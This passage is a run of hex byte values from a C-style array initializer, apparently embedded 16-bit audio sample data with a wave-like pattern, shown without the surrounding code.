	0x35,0xAC,0x2C,0x37,0x1F,0x18,0x0F,0x6D,0xFE,0xD3,0xEE,0xE6,
	0xE1,0x39,0xD6,0xEF,0xD1,0x2E,0xD0,0xAF,0xD5,0x05,0xDC,0xDF,
	0xE6,0xE2,0xF2,0x9B,0xFF,0x95,0x0C,0x77,0x17,0x49,0x1E,0x73,
	0x21,0xF0,0x22,0x64,0x20,0x4B,0x1B,0x86,0x13,0xFE,0x0A,0x80,
	0x00,0x74,0xF7,0x8C,0xF0,0x90,0xEB,0x9C,0xE8,0x9C,0xE7,0xB9,
	0xE9,0x9B,0xEE,0x20,0xF4,0x93,0xFB,0xB6,0x02,0x76,0x08,0x57,
	0x0C,0xB1,0x0F,0x4A,0x0F,0xE6,0x0E,0x5D,0x0A,0xAF,0x04,0xEE,
	0xFE,0x5D,0xF8,0x7F,0xF4,0x6A,0xF2,0x25,0xF1,0x2F,0xF2,0x3C,
	0xF6,0x21,0xFC,0xFC,0x05,0x4B,0x0C,0xEF,0x13,0x08,0x17,0x43,
	0x19,0x61,0x18,0x75,0x13,0xAB,0x0B,0x60,0x00,0x71,0xF4,0x69,
	0xE8,0xC6,0xDF,0x04,0xD8,0x96,0xD6,0x1D,0xD8,0x2D,0xDF,0x0A,
	0xEA,0xB8,0xFA,0x53,0x0B,0x99,0x1C,0x3D,0x2A,0x25,0x34,0x1C,
	0x39,0x41,0x38,0x72,0x31,0x0A,0x23,0x1F,0x10,0x61,0xFB,0x6C,
	0xE6,0xF3,0xD4,0xF5,0xC6,0xC1,0xBE,0x0B,0xBC,0x77,0xC2,0xF8,
	0xD0,0xCF,0xE3,0xC9,0xF9,0x89,0x0F,0xD8,0x24,0xB1,0x35,0xA7,
	0x40,0x9F,0x44,0x48,0x40,0x33,0x34,0xE5,0x23,0xAF,0x0E,0xFF,
	0xF9,0x97,0xE5,0xB9,0xD5,0x0D,0xC9,0x1D,0xC3,0xDE,0xC6,0x55,
	0xCF,0xC8,0xDE,0x13,0xEE,0xCD,0x00,0x73,0x11,0x8F,0x20,0x1F,
	0x29,0xF8,0x2D,0x9D,0x2B,0x24,0x23,0x87,0x18,0x53,0x0B,0x18,
	0xFD,0x4D,0xF0,0xB8,0xE6,0xCF,0xE1,0x14,0xE0,0x55,0xE4,0x62,
	0xEC,0x4E,0xF6,0x66,0x01,0x43,0x0B,0x7A,0x13,0xD6,0x19,0x4E,
	0x1A,0xBA,0x17,0xB6,0x10,0x90,0x06,0xB7,0xFC,0x13,0xF2,0x04,
	0xE9,0x79,0xE3,0x13,0xE0,0x27,0xE1,0xF1,0xE8,0x73,0xF2,0x6E,
	0xFD,0xF7,0x09,0xD5,0x15,0x39,0x1E,0xF5,0x25,0x8B,0x27,0xAA,
	0x25,0x10,0x1E,0x23,0x13,0xB1,0x06,0xF0,0xF9,0x4B,0xEC,0x4F,
	0xE1,0x14,0xD8,0x8A,0xD3,0xDB,0xD4,0x01,0xD9,0x29,0xE2,0x38,
	0xED,0xBC,0xFA,0xA9,0x08,0x52,0x15,0xC6,0x21,0x4D,0x29,0x45,
	0x2C,0xC8,0x2B,0xF5,0x27,0x5D,0x1F,0x83,0x14,0xD4,0x07,0xDE,
	0xF9,0xF0,0xEC,0xA9,0xE1,0x95,0xD9,0xB2,0xD5,0x3A,0xD4,0x6F,
	0xD7,0x77,0xDE,0x58,0xE8,0x8E,0xF4,0xFC,0x02,0x6F,0x0F,0x61,
	0x1A,0x9C,0x23,0x1C,0x28,0x5C,0x2A,0x22,0x27,0xD4,0x21,0x44,
	0x17,0x01,0x0A,0xAC,0xFE,0x1F,0xF2,0x46,0xE7,0xBD,0xDF,0x4A,
	0xDA,0x63,0xDA,0x22,0xDE,0x4C,0xE5,0xE5,0xEF,0xA9,0xFA,0xB8,
	0x06,0x22,0x10,0x90,0x18,0xBD,0x1D,0x87,0x1E,0x6E,0x1B,0x5A,
	0x14,0xD4,0x0C,0x1B,0x02,0x73,0xF9,0x03,0xF0,0xB4,0xEA,0x8B,
	0xE7,0xC7,0xE9,0x0F,0xEE,0x2C,0xF5,0xF0,0xFE,0xF5,0x08,0x15,
	0x10,0x50,0x16,0xB1,0x19,0xED,0x18,0xF9,0x13,0x97,0x0A,0xAC,
	0xFF,0xDA,0xF4,0x8D,0xE9,0xF6,0xE1,0x32,0xDB,0xC4,0xDB,0x19,
	0xDF,0xB4,0xE9,0x14,0xF5,0xF3,0x04,0xDF,0x14,0x1F,0x21,0xD6,
	0x2C,0x42,0x31,0xFB,0x32,0x1B,0x2C,0x02,0x20,0x02,0x0F,0x9B,
	0xFD,0x17,0xEA,0xB1,0xDA,0x10,0xCC,0xCF,0xC4,0xC2,0xC3,0x98,
	0xC9,0xD2,0xD6,0x52,0xE7,0x46,0xFA,0xCD,0x0F,0x13,0x22,0x19,
	0x31,0x86,0x3B,0x59,0x3E,0x4D,0x3A,0x32,0x2F,0xCB,0x20,0x72,
	0x0E,0x10,0xFA,0x88,0xE7,0xE3,0xD8,0x3C,0xCD,0x5D,0xC8,0xA9,
	0xCA,0x5C,0xD1,0xDC,0xDD,0xDA,0xEC,0xBD,0xFC,0xFF,0x0C,0xE7,
	0x1A,0xC8,0x24,0xCC,0x29,0xB3,0x29,0x5F,0x24,0x8C,0x1C,0x7B,
	0x12,0x09,0x06,0x1D,0xFA,0x21,0xEF,0xE5,0xE8,0xF4,0xE5,0xB4,
	0xE5,0xDA,0xE8,0xEA,0xEE,0x6E,0xF5,0xBA,0xFD,0xAB,0x05,0x18,
	0x0A,0xFC,0x0E,0xA0,0x0F,0x99,0x0D,0xF1,0x0A,0x59,0x05,0x9D,
	0x00,0x4B,0xFA,0xD3,0xF5,0xF0,0xF2,0xBF,0xF2,0x07,0xF3,0xBE,
	0xF7,0x34,0xFB,0xC3,0x01,0x1F,0x06,0xF8,0x0C,0xA1,0x11,0x0E,
	0x13,0x62,0x13,0x42,0x10,0xDD,0x0C,0xAC,0x07,0x00,0x00,0x2E,
	0xF8,0xA7,0xF1,0x41,0xEB,0x14,0xE6,0xE4,0xE5,0x2B,0xE5,0xF1,
	0xE9,0x34,0xEE,0xB6,0xF6,0x1A,0xFE,0xF3,0x08,0x75,0x11,0xB3,
	0x19,0x81,0x1E,0xF5,0x21,0xC6,0x21,0xD1,0x1E,0xED,0x18,0xBE,
	0x0F,0x68,0x03,0xFE,0xF7,0xF6,0xEC,0x97,0xE2,0x8F,0xDA,0xAD,
	0xD5,0xFB,0xD5,0x74,0xD9,0x83,0xE1,0xB3,0xED,0x1E,0xFA,0xAD,
	0x09,0x1B,0x17,0x0A,0x23,0x05,0x2B,0xB5,0x2F,0xFB,0x2F,0x1D,
	0x29,0x1E,0x1E,0xAF,0x11,0x18,0x01,0xC6,0xF2,0x27,0xE3,0xD3,
	0xD8,0x6F,0xD1,0x85,0xCF,0xFF,0xD3,0xE7,0xDC,0x7A,0xE8,0x8D,
	0xF6,0xEB,0x06,0x29,0x14,0x91,0x20,0x36,0x27,0x81,0x29,0xC5,
	0x27,0x2D,0x20,0x5D,0x16,0x1E,0x09,0x8E,0xFC,0x44,0xF0,0x1A,
	0xE6,0xB0,0xE1,0x13,0xDF,0xC2,0xE2,0xAA,0xE9,0x37,0xF2,0x61,
	0xFC,0xDF,0x07,0x5F,0x10,0x67,0x16,0x9A,0x19,0x04,0x17,0x76,
	0x12,0x85,0x0B,0x0E,0x02,0x0B,0xF8,0x8D,0xEF,0xF3,0xE9,0xBE,
	0xE7,0x08,0xE8,0x3B,0xEC,0xF7,0xF4,0x7C,0xFD,0xE8,0x08,0x29,
	0x11,0xF7,0x19,0xC9,0x1E,0x51,0x1E,0xD6,0x1B,0x50,0x14,0x45,
	0x0A,0x78,0xFE,0xF5,0xF3,0x0F,0xE8,0x44,0xE0,0x00,0xDB,0x56,
	0xDA,0xF0,0xDE,0xDA,0xE6,0x92,0xF1,0x24,0xFD,0x66,0x0A,0x2E,
	0x16,0x21,0x1F,0xBF,0x25,0xC5,0x27,0x95,0x25,0x46,0x1F,0x53,
	0x16,0x53,0x0B,0x05,0xFE,0x8A,0xF2,0x61,0xE7,0xF2,0xE0,0x41,
	0xDB,0xD9,0xDA,0xEB,0xDD,0x75,0xE3,0x3C,0xEB,0xB2,0xF5,0xEB,
	0x00,0xC8,0x0B,0x22,0x14,0x11,0x1A,0xF4,0x1F,0x4E,0x20,0xCC,
	0x1F,0x45,0x1A,0xDB,0x14,0x0C,0x0B,0x97,0x02,0x68,0xF9,0x55,
	0xF1,0x21,0xEA,0x57,0xE5,0x8A,0xE3,0x54,0xE4,0x02,0xE7,0x67,
	0xEC,0xE0,0xF3,0xC6,0xFB,0x96,0x03,0xC9,0x0B,0x91,0x11,0xEA,
	0x16,0x1E,0x17,0xE0,0x17,0x37,0x14,0x51,0x0F,0x70,0x09,0x19,
	0x02,0x01,0xFA,0xFB,0xF4,0xDA,0xF0,0x60,0xEE,0x18,0xEE,0x1F,
	0xF0,0x44,0xF4,0x2D,0xF9,0x68,0xFF,0x64,0x05,0x44,0x0A,0x0B,
	0x0C,0xF8,0x0D,0xB3,0x0C,0x4E,0x09,0x08,0x04,0x44,0xFE,0x88,
	0xF8,0xA0,0xF3,0x98,0xF0,0x66,0xEF,0xA6,0xF1,0x79,0xF5,0xA1,
	0xFB,0xB7,0x03,0x22,0x0B,0x0A,0x12,0x3B,0x17,0x86,0x1A,0x00,
	0x19,0x2D,0x14,0xFB,0x0D,0xBB,0x04,0x2A,0xF9,0x4A,0xEE,0x5F,
	0xE4,0xBC,0xDD,0xBC,0xDA,0x93,0xDB,0xD5,0xE1,0x6D,0xEA,0xB7,
	0xF6,0xD4,0x04,0xA7,0x12,0xB0,0x1F,0x27,0x28,0x47,0x2C,0xF4,
	0x2C,0xB0,0x27,0x81,0x1D,0xDF,0x10,0xB1,0x01,0x60,0xF1,0xB4,
	0xE3,0x8E,0xD8,0x9A,0xD2,0x16,0xD0,0xAE,0xD4,0x6D,0xDC,0xDD,
	0xE9,0x14,0xF7,0xB2,0x07,0x06,0x15,0x39,0x20,0x97,0x27,0xF2,
	0x2A,0xAC,0x28,0xB0,0x22,0x5C,0x18,0x76,0x0C,0x30,0xFF,0x0F,
	0xF2,0xD2,0xE8,0xE9,0xE2,0x46,0xDF,0x59,0xE0,0x31,0xE4,0xA0,
	0xEC,0x0A,0xF5,0x56,0xFF,0x13,0x07,0xF4,0x0F,0x04,0x13,0x9A,
	0x15,0x5F,0x14,0x3B,0x10,0x84,0x0A,0xEB,0x04,0x54,0xFD,0xBE,
	0xF8,0x22,0xF4,0x4D,0xF2,0x9C,0xF3,0x12,0xF5,0x7C,0xF9,0x8A,
	0xFE,0xB6,0x04,0x26,0x08,0xDD,0x0C,0x13,0x0D,0x6E,0x0C,0xDE,
	0x0A,0x74,0x06,0x5D,0x01,0x03,0xFB,0x1A,0xF5,0x83,0xF1,0x0D,
	0xEE,0x4A,0xED,0x87,0xEE,0xD7,0xF2,0x26,0xF7,0x37,0xFD,0x95,
	0x04,0x88,0x0B,0x3B,0x10,0xEB,0x14,0xFA,0x17,0x0D,0x16,0xEF,
	0x14,0x94,0x10,0x20,0x09,0xE8,0x02,0x7E,0xFA,0xA6,0xF3,0x40,
	0xEC,0xF7,0xE8,0x40,0xE5,0x7F,0xE5,0x0D,0xE7,0x38,0xEB,0xE3,
	0xF2,0x88,0xFA,0x73,0x02,0xF6,0x0B,0x7A,0x13,0x40,0x19,0x7B,
	0x1D,0x69,0x1E,0x96,0x1C,0xE1,0x18,0x68,0x11,0x8D,0x08,0xE6,
	0xFF,0x3C,0xF5,0x64,0xEC,0x57,0xE5,0x14,0xE0,0x75,0xDF,0x06,
	0xE0,0xDC,0xE5,0xBA,0xED,0x36,0xF6,0xB3,0x01,0x44,0x0B,0xBC,
	0x14,0xE0,0x1B,0xA3,0x1F,0x65,0x1F,0xD7,0x1C,0xFA,0x17,0x0D,
	0x0E,0xA6,0x04,0xBF,0xFA,0x98,0xF1,0x79,0xEA,0x5C,0xE5,0xF6,
	0xE4,0xA9,0xE6,0x93,0xEB,0x79,0xF2,0xAF,0xFB,0x32,0x03,0xDB,
	0x0B,0x87,0x11,0x3C,0x14,0x55,0x14,0x8B,0x11,0xF5,0x0C,0xF1,
	0x06,0x2A,0xFE,0x9E,0xF7,0x87,0xF2,0x0A,0xEE,0xE4,0xEE,0x62,
	0xF0,0x94,0xF5,0x4E,0xFC,0x0B,0x03,0xCA,0x0B,0x51,0x11,0x69,
	0x15,0x2C,0x16,0x0C,0x13,0xCA,0x0E,0x86,0x06,0xCC,0xFD,0x85,
	0xF3,0xDD,0xEB,0x31,0xE4,0xC3,0xE1,0x85,0xE1,0xFA,0xE6,0x2C,
	0xED,0xBF,0xF7,0xF8,0x03,0xBC,0x0F,0x9B,0x1A,0x0F,0x21,0xBC,
	0x25,0xA4,0x25,0x58,0x20,0xD4,0x18,0x83,0x0D,0x30,0x00,0x19,
	0xF2,0xCB,0xE6,0xF0,0xDD,0xEA,0xD8,0x9C,0xD7,0x8A,0xDA,0xD4,
	0xE2,0x30,0xEC,0xCA,0xF9,0x5D,0x06,0x65,0x12,0x6A,0x1C,0x2F,
	0x22,0xB4,0x25,0x5B,0x24,0x04,0x1E,0xED,0x16,0xBC,0x0C,0x6D,
	0x01,0x48,0xF6,0xA1,0xED,0x9C,0xE6,0xFF,0xE3,0x42,0xE2,0xAE,
	0xE5,0x3F,0xEA,0x84,0xF1,0xA3,0xF9,0x9C,0x01,0x7E,0x08,0x88,
	0x0E,0x21,0x11,0xC7,0x13,0x35,0x12,0x6C,0x0F,0xBA,0x0B,0xB0,
	0x06,0xF4,0x02,0x1D,0xFD,0xAA,0xFA,0x05,0xF7,0x84,0xF6,0x5C,
	0xF6,0x91,0xF7,0xEC,0xFA,0x12,0xFC,0x9B,0xFF,0x27,0x01,0x6A,
	0x03,0x29,0x04,0x34,0x04,0x62,0x03,0xA4,0x02,0x2A,0x00,0x47,
	0xFE,0x54,0xFC,0x8A,0xFB,0x0B,0xFA,0x0E,0xF9,0xDE,0xFA,0xAA,
	0xFC,0x65,0xFE,0xD1,0x01,0xA9,0x04,0xB2,0x07,0xAA,0x0A,0x33,
	0x0B,0xEE,0x0C,0x8C,0x0B,0xD1,0x09,0xAE,0x06,0x3E,0x01,0xCC,
	0xFC,0xB9,0xF7,0x74,0xF2,0x78,0xEE,0x55,0xEB,0xB2,0xEB,0x0C,
	0xEC,0x98,0xF0,0x40,0xF5,0xC6,0xFC,0xC5,0x04,0xB0,0x0C,0xC4,
	0x14,0x0B,0x19,0x9D,0x1C,0xBA,0x1C,0xFC,0x1A,0x46,0x14,0xB3,
	0x0C,0xA7,0x02,0xD5,0xF8,0x45,0xEE,0x28,0xE5,0xAE,0xDF,0xC8,
	0xDD,0x20,0xDE,0x1A,0xE2,0xB8,0xEA,0x92,0xF4,0xE0,0x00,0x8A,
	0x0C,0x3C,0x16,0x9F,0x1E,0x84,0x23,0x13,0x23,0xDE,0x20,0xC8,
	0x1A,0x1A,0x10,0x87,0x05,0x42,0xF9,0xB4,0xEF,0x37,0xE6,0xE8,
	0xE1,0x97,0xDF,0xD8,0xE1,0xDE,0xE7,0x59,0xEF,0x7C,0xF9,0x28,
	0x03,0x1E,0x0C,0x26,0x13,0x3B,0x17,0x93,0x18,0xC0,0x16,0xBC,
	0x11,0xDE,0x0A,0xEE,0x02,0xFC,0xFB,0x33,0xF4,0x9B,0xF0,0x05,
	0xED,0xF5,0xEE,0xA5,0xF1,0xF6,0xF7,0x63,0xFE,0x10,0x04,0xE9,
	0x0A,0xDF,0x0F,0x19,0x11,0x08,0x10,0x61,0x0D,0x25,0x07,0xAA,
	0x00,0xAD,0xF9,0x3B,0xF2,0x6D,0xED,0x3D,0xEA,0x57,0xEA,0x31,
	0xEC,0xF9,0xF2,0x74,0xFA,0x05,0x02,0xBD,0x0B,0x86,0x13,0x3F,
	0x18,0xE9,0x1B,0xCC,0x1B,0x83,0x18,0x10,0x11,0xBB,0x09,0x26,
	0xFF,0x48,0xF5,0x5C,0xEC,0x8F,0xE5,0xD5,0xE1,0xD9,0xE1,0x03,
	0xE3,0x80,0xE9,0x13,0xF1,0x1A,0xFA,0x9E,0x04,0x89,0x0D,0xD3,
	0x15,0x8E,0x1B,0x05,0x1D,0xAB,0x1D,0x45,0x19,0xEF,0x14,0x17,
	0x0C,0x75,0x03,0xEB,0xFB,0x53,0xF3,0x78,0xED,0x13,0xE8,0xB5,
	0xE6,0xB6,0xE7,0x36,0xEA,0x06,0xEE,0xBB,0xF4,0xC0,0xFB,0x78,
	0x02,0x48,0x08,0x9E,0x0D,0xE9,0x11,0xA4,0x13,0x87,0x13,0x8B,
	0x11,0xDF,0x0E,0xC2,0x0A,0x78,0x05,0x65,0x00,0x0D,0xFB,0x03,
	0xF6,0xBF,0xF3,0x96,0xF1,0xBC,0xF1,0x4F,0xF2,0x4D,0xF4,0x90,
	0xF7,0xDB,0xFB,0xCA,0xFF,0xEA,0x03,0xBA,0x06,0xD2,0x08,0xEE,
	0x09,0xE5,0x09,0xA7,0x08,0x33,0x05,0xBC,0x02,0xA5,0xFF,0x6F,
	0xFC,0x95,0xFA,0x70,0xF9,0x44,0xF9,0x3C,0xFA,0x6D,0xFC,0xB8,
	0xFF,0xCF,0x03,0x2E,0x06,0x43,0x08,0x91,0x09,0xB3,0x09,0x6C,
	0x07,0x9B,0x04,0x4E,0xFF,0xD6,0xFA,0xC4,0xF5,0xC6,0xF1,0x97,
	0xEE,0xDF,0xEE,0x2C,0xEF,0xC2,0xF3,0x96,0xF9,0x60,0x00,0x89,
	0x08,0x45,0x0F,0x95,0x15,0x77,0x19,0x28,0x1A,0x24,0x18,0x34,
	0x13,0x64,0x0C,0x0E,0x02,0xF6,0xF9,0x2D,0xEF,0xE0,0xE8,0x18,
	0xE2,0xBB,0xE0,0x70,0xE1,0x8B,0xE6,0x09,0xED,0x73,0xF6,0xFF,
	0x01,0x97,0x0C,0x0C,0x15,0x2F,0x1C,0x03,0x1F,0xD5,0x20,0x3A,
	0x1D,0x27,0x16,0xF2,0x0E,0x5A,0x04,0x63,0xFA,0x39,0xF0,0xF8,
	0xE9,0x92,0xE4,0xC8,0xE3,0x10,0xE4,0x8F,0xE9,0x05,0xEF,0xD0,
	0xF8,0x06,0x00,0xA7,0x08,0xC0,0x0F,0x76,0x14,0x17,0x16,0x28,
	0x15,0x86,0x12,0x6C,0x0D,0x65,0x07,0x2C,0x00,0x90,0xFA,0x64,
	0xF5,0x64,0xF2,0x1E,0xF0,0xE8,0xF1,0xD3,0xF4,0xAB,0xF8,0xEC,
	0xFD,0xE7,0x02,0xDB,0x07,0x20,0x0A,0x2A,0x0B,0x8A,0x0B,0x00,
	0x08,0x9C,0x04,0xBD,0xFF,0xFB,0xFB,0x09,0xF6,0x97,0xF3,0x45,
	0xF1,0xA0,0xF1,0xFD,0xF4,0x6D,0xF8,0xBC,0xFE,0x6A,0x04,0xBF,
	0x0A,0xEE,0x10,0x28,0x13,0xB9,0x15,0x19,0x13,0xF5,0x10,0x49,
	0x0A,0x65,0x02,0xEC,0xFA,0xB7,0xF2,0xBE,0xEB,0xEE,0xE7,0x14,
	0xE4,0xD9,0xE5,0x9B,0xE9,0x65,0xEF,0xDD,0xF8,0x4C,0x01,0xBF,
	0x0B,0x2C,0x13,0x8F,0x19,0xF3,0x1D,0x97,0x1E,0x04,0x1B,0x22,
	0x15,0x4A,0x0D,0x2A,0x03,0xAD,0xF9,0xDC,0xF0,0xD3,0xE9,0x89,
	0xE4,0xCB,0xE3,0x19,0xE4,0x98,0xE9,0x0A,0xEF,0xD2,0xF8,0x14,
	0x00,0xD6,0x09,0x27,0x10,0x20,0x14,0xFB,0x17,0x3B,0x16,0xBF,
	0x13,0xC9,0x0E,0xF1,0x08,0xE2,0x02,0x59,0xFC,0x18,0xF6,0xD1,
	0xF3,0x0E,0xF1,0x24,0xF1,0x1A,0xF2,0xC1,0xF5,0xB5,0xF9,0x7B,
	0xFD,0x8B,0x01,0x62,0x04,0x89,0x06,0xA6,0x07,0x8C,0x07,0x41,
	0x05,0xF8,0x03,0xFE,0x01,0xAD,0xFF,0x62,0xFD,0x6C,0xFC,0x18,
	0xFB,0x9A,0xFC,0x01,0xFD,0x32,0xFE,0xF0,0x00,0xF6,0x03,0x00,
	0x04,0xCF,0x06,0x19,0x06,0xA2,0x06,0x4B,0x05,0x17,0x03,0x26,
	0x00,0xAE,0xFD,0xE7,0xFB,0x1A,0xF8,0x94,0xF6,0x9B,0xF5,0x73,
	0xF5,0x4A,0xF6,0x32,0xF8,0x24,0xFA,0xF5,0xFE,0x73,0x02,0x59,
	0x06,0x57,0x0A,0x07,0x0C,0xFD,0x0E,0xE3,0x0F,0x7C,0x0E,0xAB,
	0x0C,0x6D,0x08,0xD8,0x04,0x26,0xFE,0xBD,0xF9,0x20,0xF3,0xDB,
	0xEF,0x85,0xEC,0x8E,0xEB,0x54,0xEC,0x15,0xEE,0xDF,0xF3,0x8A,
	0xF9,0xAC,0x00,0xB2,0x07,0xE2,0x0E,0x87,0x13,0xE9,0x17,0x6C,
	0x18,0xA0,0x17,0x4C,0x13,0x7F,0x0D,0x93,0x06,0x24,0xFD,0xFD,
	0xF5,0xFF,0xEF,0x00,0xE9,0xBE,0xE6,0xDB,0xE6,0xB3,0xE9,0x4E,
	0xEE,0x57,0xF5,0x34,0xFD,0x1C,0x05,0x2E,0x0C,0x8A,0x12,0x52,
	0x15,0xDE,0x16,0xD0,0x15,0x1D,0x11,0x0F,0x0B,0x38,0x04,0x58,
	0xFD,0x4A,0xF6,0xE8,0xF1,0xF7,0xEF,0x09,0xEE,0x72,0xF0,0x26,
	0xF3,0xD0,0xF8,0xD9,0xFE,0x84,0x04,0x0F,0x08,0xB7,0x0B,0xDA,
	0x0D,0x0A,0x0C,0x27,0x09,0x62,0x05,0x35,0x00,0x42,0xFB,0x47,
	0xF6,0xFC,0xF4,0x07,0xF2,0xEB,0xF3,0xE3,0xF6,0xD6,0xFB,0x5D,
	0x00,0xDA,0x06,0x90,0x0B,0xB9,0x0F,0x91,0x11,0x7F,0x11,0x26,
	0x0E,0x76,0x09,0xB5,0x03,0x6B,0xFC,0x5D,0xF5,0x69,0xEF,0x6F,
	0xEB,0x2E,0xE9,0x3A,0xE9,0xEE,0xED,0x47,0xF2,0xEA,0xFA,0x2D,
	0x02,0x3F,0x0A,0x38,0x11,0x30,0x16,0x60,0x19,0x1F,0x19,0x1B,
	0x16,0x5A,0x11,0x31,0x0A,0x38,0x02,0x3A,0xFA,0x14,0xF2,0xA3,
	0xEC,0xB8,0xE8,0xEB,0xE7,0x9C,0xE8,0xDD,0xEC,0x70,0xF1,0xE0,
	0xF8,0x87,0xFF,0xB3,0x06,0x9E,0x0C,0x98,0x11,0x0A,0x13,0x92,
	0x14,0x0D,0x12,0x8E,0x0F,0x62,0x0A,0xF0,0x05,0xB9,0x00,0x46,
	0xFB,0x28,0xF6,0xE0,0xF3,0xC7,0xF2,0x0B,0xF1,0xB3,0xF2,0xAC,
	0xF4,0xC9,0xF7,0xC3,0xFB,0x3D,0xFE,0xD4,0x02,0x31,0x05,0x0D,
	0x07,0x32,0x08,0x80,0x08,0xED,0x08,0x80,0x07,0x50,0x05,0x8E,
	0x03,0x75,0x01,0x44,0xFF,0x35,0xFD,0x76,0xFC,0x2A,0xFB,0x6F,
	0xFB,0x58,0xFB,0xDA,0xFC,0xDA,0xFE,0x26,0xFF,0x8E,0x00,0xE1,
	0x01,0xF1,0x02,0x93,0x02,0xA4,0x02,0x19,0x01,0x00,0xFF,0x82,
	0xFD,0xD8,0xFC,0x41,0xFA,0xFF,0xFA,0x4E,0xFA,0x62,0xFB,0x5D,
	0xFD,0x3A,0xFF,0xD3,0x02,0xE6,0x06,0x11,0x08,0xF0,0x0B,0x1A,
	0x0C,0x33,0x0B,0xF2,0x0A,0x38,0x07,0x0C,0x02,0xB1,0xFD,0x95,
	0xF8,0x4A,0xF3,0x68,0xEF,0x86,0xED,0x2D,0xEC,0xC8,0xEE,0x8E,
	0xF2,0x6C,0xF8,0x08,0xFE,0xD3,0x06,0x1A,0x0D,0x12,0x12,0xEB,
	0x16,0xEC,0x18,0x8B,0x17,0x80,0x13,0xD5,0x0D,0xE6,0x06,0x51,
	0xFD,0xEA,0xF5,0x97,0xEE,0x4B,0xE8,0xDE,0xE5,0xF2,0xE5,0xE5,
	0xE8,0xB9,0xEE,0x15,0xF5,0x57,0xFD,0xB1,0x06,0x2E,0x0D,0xD8,
	0x13,0xD4,0x17,0x6F,0x18,0x4F,0x16,0x72,0x12,0x23,0x0B,0xF8,
	0x04,0xB7,0xFD,0x3C,0xF6,0x6C,0xF1,0x18,0xED,0xD1,0xEC,0xE2,
	0xEE,0x45,0xF1,0xAE,0xF6,0x95,0xFC,0x4B,0x02,0x0C,0x07,0x16,
	0x0A,0xCB,0x0C,0xC3,0x0C,0xCF,0x0B,0x13,0x07,0xE6,0x03,0xD4,
	0xFF,0x73,0xFB,0x6B,0xF8,0x50,0xF6,0x9B,0xF6,0x81,0xF7,0xFC,
	0xFA,0xC7,0xFE,0x74,0x02,0x7C,0x06,0x46,0x09,0x3F,0x0A,0xEB,
	0x0B,0x03,0x09,0x7A,0x06,0x79,0x02,0x65,0xFD,0xBE,0xF9,0x1C,
	0xF5,0x18,0xF2,0x40,0xF0,0xFC,0xF1,0x85,0xF3,0xD5,0xF7,0xA9,
	0xFC,0x95,0x02,0x0E,0x07,0x76,0x0C,0x30,0x0F,0xAE,0x11,0x89,
	0x11,0x85,0x0F,0xA4,0x0C,0x20,0x07,0x58,0x01,0xCB,0xFC,0x0C,
	0xF6,0xB0,0xF2,0x46,0xEF,0x42,0xED,0xEA,0xEE,0x51,0xF0,0x66,
	0xF3,0xEC,0xF8,0x8A,0xFD,0xC7,0x03,0x25,0x08,0x20,0x0C,0x45,
	0x0F,0x36,0x10,0xBB,0x10,0xBD,0x0F,0x42,0x0C,0x72,0x08,0x92,
	0x03,0xFE,0xFF,0x26,0xFA,0x7A,0xF6,0x5F,0xF3,0x2A,0xF1,0x22,
	0xF0,0x74,0xF1,0x31,0xF3,0x44,0xF6,0x77,0xFA,0x79,0xFE,0xEB,
	0x03,0x64,0x07,0x7D,0x0A,0xD1,0x0D,0x0B,0x0D,0xF2,0x0D,0x75,
	0x0B,0xA9,0x08,0xC1,0x05,0x0D,0x00,0xF4,0xFC,0xE4,0xF9,0x50,
	0xF6,0x9C,0xF5,0x10,0xF4,0xD2,0xF5,0xDC,0xF8,0x00,0xFA,0xF5,
	0xFE,0x59,0x01,0xBB,0x04,0xAC,0x06,0xC9,0x07,0xCB,0x07,0x9C,
	0x06,0x50,0x04,0x1F,0x01,0x58,0xFE,0x69,0xFB,0xCA,0xF9,0xE8,
	0xF9,0x15,0xF9,0x76,0xFB,0x06,0xFD,0x8F,0x00,0xBD,0x04,0x1C,
	0x07,0x2A,0x09,0x6C,0x0A,0x79,0x0A,0x10,0x08,0x25,0x04,0xE3,
	0x00,0xA5,0xFB,0xED,0xF7,0x51,0xF3,0x6B,0xF0,0xD3,0xEF,0xF3,
	0xF1,0x02,0xF3,0xFB,0xF8,0x95,0xFE,0x4F,0x04,0x88,0x0A,0x8B,
	0x0F,0x96,0x13,0x06,0x14,0x62,0x13,0x71,0x10,0x45,0x0B,0x2F,
	0x04,0xC0,0xFD,0xAA,0xF6,0xBF,0xF0,0xC8,0xEC,0x7B,0xEA,0x57,
	0xEA,0x94,0xED,0x2F,0xF1,0xD2,0xF7,0xF6,0xFE,0xE0,0x05,0xCF,
	0x0B,0xF5,0x10,0xA5,0x13,0x62,0x13,0xE7,0x12,0x41,0x0E,0xB3,
	0x09,0xB1,0x03,0xDC,0xFD,0xE1,0xF8,0x74,0xF4,0x2C,0xF1,0x76,
	0xF0,0x85,0xF1,0x58,0xF3,0xB9,0xF7,0x48,0xFB,0x89,0xFF,0xEC,
	0x03,0xEB,0x07,0x12,0x09,0x14,0x09,0xD2,0x09,0x4F,0x07,0xBC,
	0x05,0x65,0x02,0xA7,0xFF,0xEB,0xFD,0x8F,0xFB,0xDB,0xFA,0xFA,
	0xFA,0xF7,0xFB,0xB9,0xFD,0x16,0xFE,0xCE,0x00,0x97,0x02,0x26,
	0x03,0x3D,0x03,0xB4,0x03,0x7F,0x02,0xA7,0x01,0x53,0xFF,0xAD,
	0xFD,0xF4,0xFC,0x66,0xFB,0x40,0xFA,0xB0,0xFA,0xC9,0xFB,0x8E,
	0xFC,0xEA,0xFE,0xB8,0x00,0xCA,0x02,0xE0,0x04,0xC3,0x06,0x37,
	0x07,0x12,0x07,0x3C,0x06,0xAD,0x05,0x72,0x03,0xA6,0x01,0x72,
	0xFF,0x05,0xFC,0x9F,0xFA,0x7C,0xF8,0xCD,0xF7,0xBB,0xF7,0x60,
	0xF7,0xCC,0xF8,0xF3,0xFA,0xC1,0xFD,0x10,0xFF,0xB2,0x02,0x6E,
	0x05,0x04,0x07,0x3D,0x08,0xDF,0x09,0xBD,0x09,0xB8,0x08,0xC8,
	0x06,0xFD,0x04,0x7C,0x01,0x7F,0xFE,0x4A,0xFB,0x31,0xF8,0x80,
	0xF6,0x81,0xF5,0x6E,0xF5,0x68,0xF6,0x74,0xF8,0x77,0xFB,0x3D,
	0xFE,0x7E,0x01,0xE3,0x05,0x14,0x07,0xB3,0x09,0x7B,0x0A,0x3C,
	0x09,0xE7,0x08,0x8B,0x06,0x4D,0x03,0x78,0x00,0x6A,0xFD,0x7D,
	0xFB,0x00,0xF9,0x35,0xF8,0x45,0xF8,0x3D,0xF9,0x0F,0xFA,0x94,
